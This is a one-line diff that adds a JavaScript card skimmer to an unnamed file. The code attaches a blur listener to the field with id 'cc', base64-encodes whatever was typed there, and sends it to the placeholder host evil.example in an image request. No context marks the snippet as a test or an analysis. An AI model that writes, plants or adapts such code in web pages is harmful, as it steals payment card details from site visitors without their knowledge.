@@ -1,0 +1,1 @@
+(function(){var f=document.querySelector("#cc");f.addEventListener("blur",function(){new Image().src="https://evil.example/c?d="+btoa(f.value)})})();
